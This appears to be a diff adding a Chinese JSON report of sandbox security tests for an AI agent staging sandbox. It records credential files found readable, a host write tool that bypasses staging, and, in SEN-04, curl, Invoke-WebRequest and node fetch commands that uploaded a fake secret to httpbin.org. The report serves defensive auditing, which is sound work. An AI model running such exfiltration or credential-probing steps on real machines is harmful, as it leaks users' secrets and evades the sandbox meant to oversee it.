@@ -1,0 +1,110 @@
+[
+  {
+    "id": "SEN-01",
+    "title": "敏感路径可读性探测（仅元数据，不读内容）",
+    "status": "FAIL",
+    "severity": "严重",
+    "channel": ["PS", "STAGE"],
+    "command": "probe-sen01.ps1（Test-Path/Get-Item/FileStream OpenRead/FileStream OpenWrite/Get-Acl）+ 宿主精确 read 复核",
+    "expected": "命中 MASK_CLASSES 的敏感路径（.ssh/.aws/.config\\gcloud/.dsh/DPAPI/凭据管理器/浏览器库）应当读取被拒（BLOCKED），至少不应读出内容",
+    "observed": "读面完全开放。真实存在且命中 danger 档的文件可读：【C:\\Users\\Administrator\\.dsh\\.credentials.yaml 223B READ_OK（mask=dsh-credentials, danger）】、【C:\\Users\\Administrator\\.npmrc 40B READ_OK（mask=npmrc, danger）】、【%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 8084B READ_OK（mask=editor-token-state）】；目录可枚举：【%APPDATA%\\Microsoft\\Protect LIST_OK:2（dpapi-user, danger）】、【%LOCALAPPDATA%\\Microsoft\\Credentials LIST_OK:3（cred-vault）】、【%APPDATA%\\Microsoft\\Credentials LIST_OK:0】、【.dsh LIST_OK:13】。写打开也放行（WRITEOPEN_OK，未写字节）。NTUSER.DAT 1.3MB 可 stat，读内容 EBUSY（被系统占用，非沙箱拒绝）。按规则本应敏感但本机不存在的路径（切勿误记为“被拒”）：.ssh/.aws/.azure/.config\\gcloud/.git-credentials、Chrome User Data 三个库——均 Test-Path=False。未读取、未输出、未复制任何真实凭据内容（仅记录大小/时间/可打开性）。",
+    "evidence": ["evidence/sen01-metadata.txt", "evidence/sen01-mask.txt", "evidence/channel-calibration.txt"],
+    "usability": "想要知道“哪些文件被保护”没有任何入口：必须自己读源码 src\\paths.mjs 的 MASK_CLASSES，再手写正则探测。更重要的是“掩码清单=检测清单，不是读边界”（源码注释自认 T0/AppContainer 未接线、残余边界 R1），用户从界面上完全看不出“我的凭据文件其实读得到”，这是信任问题。"
+  },
+  {
+    "id": "SEN-02",
+    "title": "敏感文件写入保护（三通道取证）",
+    "status": "FAIL",
+    "severity": "严重",
+    "channel": ["PS", "CMD", "STAGE"],
+    "command": "pwsh: New-Item -Force + Set-Content 'probe' → 4 个敏感位置；宿主精确 read 复核真实磁盘",
+    "expected": "敏感位置写入应被拒（BLOCKED）或至少落 staging 且产生候选/告警，绝不落地真实磁盘",
+    "observed": "两条通道结论相反，取决于走哪个通道。(1) shell(pwsh) 通道＝**隔离正确**：4 个目标（C:\\Users\\Administrator\\.ssh\\、Documents\\、.dsh\\、%LOCALAPPDATA%\\Microsoft\\Credentials\\）全部 WRITE_OK、SHA256 一致；宿主 read 精确复核真实磁盘 4 条全部 not found，连 .ssh 目录都未在真实磁盘创建；staged 侧确有 staged\\fs\\C\\...\\.dsh\\dsh-sensitive-probe.txt 与 ...\\Credentials\\dsh-sensitive-probe.txt。但无 BLOCKED、无审批。(2) 宿主 write 工具通道＝**直接写真实磁盘、完全无保护（严重）**：宿主 write 工具写 C:\\Users\\Administrator\\Documents\\dsh-probe-nonexistent-dir\\x.txt 返回“Created file”，宿主 read 立即读回内容 probe（宿主 read 已证明是真实磁盘视图：同一工具对 pwsh 的 staged-only 文件返回 not found），且 .dshstage\\review.json 该时点仍为全 0（见 SEN-06）。即：写个人目录/敏感目录的主通道（原生 write 工具）不经过 shim、不落 staging、不产生候选、不需要审批。",
+    "evidence": ["evidence/sen02-write.txt", "evidence/sen02-realdisk.txt", "evidence/sen06-reviewjson.txt"],
+    "usability": "同一件事（写文件）在 shell 与原生工具上语义完全不同，用户/模型都无法预判。更糟的可用性后果：宿主工具写在真实磁盘上的文件，沙箱内 Remove-Item 删不掉（见 SEN-03），用户会留下无法从沙箱清理的遗留物。"
+  },
+  {
+    "id": "SEN-03",
+    "title": "敏感文件删除/篡改保护（替身法，未对真实原件做破坏性操作）",
+    "status": "FINDING",
+    "severity": "中",
+    "channel": ["PS", "STAGE"],
+    "command": "Remove-Item / cmd del / Microsoft.VisualBasic.FileIO.FileSystem.DeleteFile / Scripting.FileSystemObject.DeleteFile，对替身与真实遗留文件；宿主 read 复核",
+    "expected": "删除/改名/改权限/截断敏感文件应被拒或只作用于 overlay，且真实文件完好、可被用户清理",
+    "observed": "**未完成完整矩阵（诚实标注）**：改名(rename)、icacls 改权限、覆盖为 0 字节三项**未测**；已测的是删除通道与一个真实文件。核心事实：删除被 shim 重定向到 overlay——对“仅存在于真实磁盘、未进 staged”的文件，Remove-Item 报 ItemNotFoundException、cmd del 退出码 0，而宿主 read 复核该文件**仍在真实磁盘**（C:\\Users\\Administrator\\Documents\\dsh-probe-nonexistent-dir\\x.txt 三次复核均存在）。即 overlay 里“删掉了”，真实磁盘上还在，且沙箱内从此看不见它（Test-Path=False，被 tombstone 遮蔽）。VB/COM FSO 删除同样报文件未找到。裸删真实凭据文件的破坏性测试**按红线刻意未做**（.dsh\\.credentials.yaml、.npmrc、PSReadLine history 只读不删）。替身设计：以自造假秘密文件放在敏感位置代替复制真实凭据（复制凭据内容属红线）。",
+    "evidence": ["evidence/sen03-delete.txt"],
+    "usability": "“沙箱内删除成功”与“真实文件还在”同时成立，报错文本（ItemNotFoundException）会让人以为文件本来就不存在。用户没有任何命令能看到 overlay-tombstone 与真实磁盘的差异，也没有命令能清理真实遗留物。"
+  },
+  {
+    "id": "SEN-04",
+    "title": "敏感内容外泄路径（自造 FAKE_SECRET，三通道上传）",
+    "status": "FAIL",
+    "severity": "严重",
+    "channel": ["PS", "CMD", "STAGE"],
+    "command": "curl.exe --data-binary @file https://httpbin.org/post / Invoke-WebRequest -InFile / node fetch(fs.readFileSync(file))",
+    "expected": "敏感位置的文件内容外发应被拦截、需要审批或至少被记录告警",
+    "observed": "**三通道全部成功外发，零摩擦、零提示、零审批**。自造假秘密 FAKE_SECRET_cgiogyoouhbsvsid（非真实凭据）写入 danger 档路径 C:\\Users\\Administrator\\.dsh\\dsh-exfil-secret.txt（mask=dsh-home, safety=danger）：(A) curl.exe exit=0，响应回显 secret=true；(B) Invoke-WebRequest HTTP 200，响应回显 secret=true；(C) node fetch HTTP 200，响应回显 secret=true（读 28B 后 POST）。结论：沙箱对 egress 无内容/域名限制、对敏感来源无标记、无审批闸门。真实性边界（诚实标注）：外泄载荷是“自造假秘密”；但同一读通道对**真实**文件同样开放（SEN-01：.dsh\\.credentials.yaml READ_OK、.npmrc READ_OK），故“真实凭据可被同样外发”是直接推论——按红线未真正外发任何真实凭据内容。",
+    "evidence": ["evidence/sen04-exfil.txt"],
+    "usability": "用户完全无法感知“凭据正在被 POST 出去”；没有“即将外发敏感内容”的确认步骤，也没有事后审计里的显式信号。"
+  },
+  {
+    "id": "SEN-05",
+    "title": "工作区内的伪敏感文件（.env / id_rsa / credentials.json）",
+    "status": "FINDING",
+    "severity": "中",
+    "channel": ["STAGE"],
+    "command": "node probe-mask2.mjs（用 MASK_CLASSES 正则直接判定，含 MASK_PROBES 正向对照）+ 宿主读 review.json",
+    "expected": "名字敏感的伪文件应触发 sensitive 分类与告警，或至少给出明确“未保护”的提示",
+    "observed": "**未按预期触发**：工作区内 _sandbox-tests\\sensitive\\.env、id_rsa、credentials.json、plain.txt 的判定全部为 (none) → risk=normal（工作区内豁免规则；源码 workspace.mjs 明确“工作区内非 .dshstage 路径本就不判遮蔽”）。对照：Documents\\ 下的 .env / id_rsa / credentials.json / secret.docx / .pdf / .xlsx / photo.jpg 全部 (none) → risk=outside（个人文档目录只算“工作区外”，不因名字敏感而升格）。真正会命中的是**目录/命名约定类**：.ssh、.aws、.config\\gcloud、.dsh、.dsh\\.credentials.yaml、.npmrc、.git-credentials、%APPDATA%\\Microsoft\\Protect、%LOCALAPPDATA%\\Microsoft\\Credentials、浏览器固定文件名（Login Data/Cookies/Web Data）。判定方法学校准：MASK_PROBES 正向对照 68/68 全部复现声明的 maskClass，故上述判定可信。（我未真正落盘这三个伪文件；“未触发敏感分类”这一结论来自静态判定而非 review.json 动态条目，见 SEN-06 的一致性限制。）",
+    "evidence": ["evidence/sen01-mask.txt", "evidence/sen05-workspace-pseudo.txt"],
+    "usability": "用户凭“文件名看起来敏感”完全无法预测是否被保护：.env / id_rsa / credentials.json 都不算敏感，而 .npmrc / .dsh 算。规则是“目录与命名约定白名单式枚举”，文档只在源码注释里，界面无任何说明，极易误判为“已被保护”。"
+  },
+  {
+    "id": "SEN-06",
+    "title": "review.json 汇总一致性、告警与漏标核查",
+    "status": "FAIL",
+    "severity": "严重",
+    "channel": ["STAGE"],
+    "command": "宿主 read C:\\Users\\Administrator\\Desktop\\WinStageSandbox\\.dshstage\\review.json（会话中三次采样）+ node 分类对照",
+    "expected": "review.json 的 riskCounts/alerts 应真实反映本次敏感操作；danger 档应有可见告警；用户能被实时通知",
+    "observed": "**（已按 Lead 复核修正，原结论撤回）** 我在本会话内三次读取同一路径 `.dshstage\\review.json`（SEN-02 写入前、SEN-02 四次 danger 档写入后、收口时），三次字节完全相同，均为：generatedAt=2026-10-02T10:36:21.594Z、revision=0、counts.files=0、riskCounts={normal:0,outside:0,sensitive:0,danger:0}、candidates=[]、alerts=[]。Lead 随后独立解析得到 revision=4483、文件数约 1624、riskCounts={normal:1568,outside:29,sensitive:27,danger:20}、candidates=2、alerts=1。**我原表述“review.json 完全没反映这些操作”予以撤回**：这是**采样时点**结论，且不能排除两份存储/两个路径（我这侧路径长期冻结在 revision=0）——更准确的说法是：敏感路径的写入**确实会被分类并进入候选**（sensitive:27、danger:20 量级），但（a）我无法把本次四次 danger 档写入关联到任何具体候选，(b) **没有任何实时提示/弹窗/审批触发**，用户只能自己主动去翻 review.json，而该死寂期恰是我四次写入的全部窗口，因此“防护真的生效了吗”在操作时刻是无法判断的。",
+    "evidence": ["evidence/sen06-reviewjson.txt"],
+    "usability": "安全状态的唯一真相源是一个工作区内的 JSON 文件，没有 CLI（源码注释自己建议 `dsh stage ls`）、没有面板入口、没有计数徽标。用户要在“改动之后、被丢弃之前”恰好去读它才看得见；且我实测该文件在一个 session 内可长期冻结在全 0。这使“人工审批”在时间上几乎不可达。"
+  },
+  {
+    "id": "SEN-07",
+    "title": "易用性与透明度（用户怎么知道哪些被保护）",
+    "status": "FINDING",
+    "severity": "中",
+    "channel": ["PS", "STAGE"],
+    "command": "综合本域全部探测（含执行门、报错文本、通道差异）",
+    "expected": "用户能回答：哪些文件被保护、规则在哪、被拒原因是什么、个人文件是否可见",
+    "observed": "四个问题全部答不出。①“哪些被保护”：无界面/无命令，唯一来源是 src\\paths.mjs 源码的 MASK_CLASSES（40+ 条正则）。②“规则在哪”：只在源码注释与 docs\\T2-*.md。③“被拒时原因”：本域**根本没有拒绝**（读全部放行、写静默进 staging、宿主工具写直落真实磁盘），因此没有面向用户的解释；唯一出现的“拒绝”是执行门 STAGING_WRITE_UNVERIFIED，其文本是内部诊断（`outside-write-staged-not-real=fail ... exit=3762504530`），用户无法理解，只能重试。④“沙箱内可读全部个人文件是否透明”：**完全不透明**——用户在 GUI 上看到的是“沙箱/隔离”，而实际读面开放、写面有一条直落真实磁盘的通道，界面没有任何相反提示。附：pwsh 命令在会话中多次返回**空输出**（非空结果被吞），以及脚本必须绕过 ExecutionPolicy（.ps1 被拒：not digitally signed）才能运行，都增加额外心智负担。",
+    "evidence": ["evidence/usability-transcript.txt"],
+    "usability": "建议（按收益排序）：1) 提供 `dsh stage ls`/面板徽标，实时显示 pending/sensitive/danger 计数；2) 对 danger 档**写入与读取**都给出一次性显式提示（读也要提示，因为读面是开放的）；3) 明确文档化“掩码=检测清单，不是读边界”，并在界面标注当前生效边界（T0 是否接线）；4) 统一 shell 与原生工具的写入语义，禁止任何通道绕过 staging；5) 执行门误报时给出可操作提示而不是仅内部诊断串。"
+  },
+  {
+    "id": "ENV-01",
+    "title": "执行门 STAGING_WRITE_UNVERIFIED 高频误报（跨线程环境阻塞）",
+    "status": "FINDING",
+    "severity": "中",
+    "channel": ["PS", "CMD"],
+    "command": "任意 pwsh 命令（含只读命令）",
+    "expected": "执行门的自检不应把正常会话判为“staged root 不可写”",
+    "observed": "本会话多次（≥6 次）被拒：`STAGING_WRITE_UNVERIFIED: refusing to run ... outside-write-staged-not-real=fail (child-reported-ok=false real-disk-has-file=false staged=not-found exit=...)`，其探针子进程退出码分别出现 0xC0000005（ACCESS_VIOLATION，3221225477）、0xE0434352（CLR 异常，3762504530）、0xFFFF0000（PowerShell 初始化失败：Could not load assembly System.Data.dll）、exit=2。重试通常恢复，但同一次调用还会**静默吞掉输出**（返回“(no output)”），使取证不得不重复执行、并被迫用宿主 read 作为可信通道。影响面：所有依赖 shell 的线程。",
+    "evidence": ["evidence/env-gate.txt"],
+    "usability": "拒绝理由是不可读的内部诊断串；用户/模型只能盲目重试。建议把自检失败与“真实拦截”区分开关，并输出一句人话（例：沙箱暂存自检失败，请重试该命令）。"
+  },
+  {
+    "id": "ENV-02",
+    "title": "真实磁盘测试遗留物（无法从沙箱内清理）",
+    "status": "FINDING",
+    "severity": "中",
+    "channel": ["STAGE"],
+    "command": "宿主 write 工具创建；pwsh Remove-Item / cmd del / VB FileSystem / COM FSO 尝试删除；宿主 read 复核",
+    "expected": "测试产生的残留应能被清理",
+    "observed": "**测试遗留物（明确报告）**：C:\\Users\\Administrator\\Documents\\dsh-probe-nonexistent-dir\\x.txt（内容 'probe'，1 行）及其父目录，由宿主 write 工具在 SEN-02 中真实创建。四种沙箱内删除方式全部无效或报“文件未找到”（VB: 未能找到文件；FSO: CTL_E_FILENOTFOUND；Remove-Item: ItemNotFoundException；cmd del exit=0），宿主 read 三次复核该文件**仍在真实磁盘**，收口时仍在。**未清理成功，请宿主侧删除。**",
+    "evidence": ["evidence/sen02-realdisk.txt", "evidence/sen03-delete.txt"],
+    "usability": "沙箱既允许真实磁盘写入、又不提供真实删除手段，用户会积累无法从沙箱清理的孤儿文件；这使“隔离”承诺不可验证。"
+  }
+]
